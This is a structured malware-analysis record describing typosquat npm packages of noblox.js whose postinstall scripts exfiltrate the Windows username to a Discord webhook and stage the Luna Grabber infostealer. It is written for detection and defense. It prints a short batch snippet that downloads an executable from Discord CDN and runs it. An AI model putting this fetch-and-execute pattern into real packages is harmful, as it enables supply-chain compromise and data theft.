package_info.why_malicious: These packages are typosquats of the legitimate noblox.js package and contain multistage malicious code that exfiltrates system/user information and delivers the Luna Grabber infostealer malware. They mimic legitimate package behavior to evade detection, but execute postinstall scripts that download and run further malicious payloads.

malicious_snippets.code_behavior: During postinstall, the code collects the Windows username and sends it to a Discord webhook, then downloads a second-stage payload (payload.bat) from Discord CDN and executes it if on Windows, enabling further compromise.

malice_analysis.why_suspicious: Postinstall scripts should not exfiltrate user information or download and execute remote payloads. Use of Discord webhooks and CDN for payload delivery is a common malware tactic.
malice_analysis.violated_expectations: Normal postinstall scripts display messages or perform setup, not credential exfiltration or remote code execution.
malice_analysis.similar_legitimate_use: Legitimate postinstall scripts may display thank-you messages or perform environment checks, but never exfiltrate data or run remote code.
key_indicators: Exfiltration of Windows username to external webhook
Download and execution of remote .bat file
Use of Discord CDN and webhooks

malicious_snippets.code_snippet:
REM (Representative, actual content not shown)
@echo off
REM Download and execute PyInstaller-compiled Luna Grabber executable
curl -o luna.exe https://cdn.discordapp.com/attachments/.../luna.exe
start luna.exe
malicious_snippets.code_behavior: After postinstall, the downloaded batch script retrieves a PyInstaller-compiled Luna Grabber executable from Discord CDN and executes it, initiating the third-stage malware.

malice_analysis.why_suspicious: Batch scripts downloaded and executed postinstall are highly suspicious, especially when fetching further executables from external sources.
malice_analysis.violated_expectations: No legitimate package should download and execute arbitrary binaries as part of installation.
malice_analysis.similar_legitimate_use: Rarely, legitimate installers may fetch dependencies, but never from Discord CDN or without user consent.
key_indicators: Use of Discord CDN for malware delivery

malicious_snippets.code_behavior: At runtime, the Luna Grabber executable collects system information and exfiltrates it to a Discord webhook, as configured in the malware's settings.

malice_analysis.why_suspicious: The executable is a known infostealer (Luna Grabber) and is configured to exfiltrate system information to an attacker-controlled webhook.
malice_analysis.violated_expectations: No legitimate package should install or run infostealer malware as part of its operation.
malice_analysis.similar_legitimate_use: System information collection may be legitimate in diagnostics tools, but not with exfiltration to Discord webhooks.
key_indicators: Exfiltration of system info to Discord webhook

attack_chain.action: User installs malicious npm package (typosquat of noblox.js).
Postinstall script collects Windows username and exfiltrates it to Discord webhook; downloads and executes second-stage batch file if on Windows.
Second-stage batch file downloads and executes Luna Grabber executable from Discord CDN.
attack_chain.leads_to: Luna Grabber infostealer runs on victim system.

attack_chain.action: Luna Grabber collects system information and exfiltrates it to attacker's Discord webhook.

behavioral_signatures: npm postinstall scripts making network requests to Discord webhooks
postinstall scripts downloading and executing remote batch or executable files
Presence of PyInstaller-compiled infostealer executables (Luna Grabber) in package installation flow
Exfiltration of system/user info to Discord webhooks
file_indicators: postinstall.js with network and exec calls
Downloaded batch files (e.g., z.bat) in package directory
Presence of luna.exe or similar PyInstaller-compiled binaries
References to Discord CDN or webhooks in code
network_indicators: Unusual HTTP POSTs during npm install
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that make outbound network requests, especially to Discord webhooks or CDN. Flag packages that download and execute remote batch or executable files. Scan for known infostealer binaries (e.g., Luna Grabber) and check for exfiltration of system/user info to external endpoints. Use static and dynamic analysis to identify suspicious postinstall.js scripts and typosquatting package names.
